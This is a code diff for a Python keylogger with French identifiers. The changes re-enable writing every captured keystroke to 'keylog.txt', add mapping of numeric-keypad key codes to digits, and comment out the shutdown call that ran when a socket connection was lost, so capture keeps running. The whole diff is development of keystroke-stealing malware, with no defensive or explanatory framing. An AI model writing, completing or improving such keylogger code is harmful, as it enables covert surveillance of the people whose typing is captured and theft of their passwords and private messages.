@@ -23,21 +23,24 @@ def argument():
 
 TXT_GLOB = ""
 
-def pav_num(nombre):
-    touche = {}
+
+def pav_num():
+
     touche = {
 
-        "< 96 >": 0,
-        "< 97 >": 1,
-        "< 98 >": 2,
-        "< 99 >": 3,
-        "< 100 >": 4,
-        "< 101 >": 5,
-        "< 102 >": 6,
-        "< 103 >": 7,
-        "< 104 >": 8,
-        "< 105 >": 9,
+        "<96>": "0",
+        "<97>": "1",
+        "<98>": "2",
+        "<99>": "3",
+        "<100>": "4",
+        "<101>": "5",
+        "<102>": "6",
+        "<103>": "7",
+        "<104>": "8",
+        "<105>": "9",
+        "<110>": "."
     }
+    return touche
 
 
 def kill_all():
@@ -55,13 +58,15 @@ def parse(srt):
     new_str = new_str.replace("Key.backspace","<-")
     new_str = new_str.replace("Key.enter","\n")
     new_str = new_str.replace("Key.shift_r", "")
-
+    if re.match(pattern, new_str):
+        nombre = pav_num()
+        new_str = nombre.get(new_str, "-1")
     return new_str
 
 def kpr(key):
         global TXT_GLOB
         with open("keylog.txt", "a") as f:
-            #f.write(parse(str(key)))
+            f.write(parse(str(key)))
             TXT_GLOB += parse(str(key))
 
 def scan_socket():
@@ -74,7 +79,7 @@ def scan_socket():
         print("Toujours Co !!")
     except :
         print("Pas Co !!")
-        kill_all()
+        #kill_all()
 
 def chrono():
     global TXT_GLOB
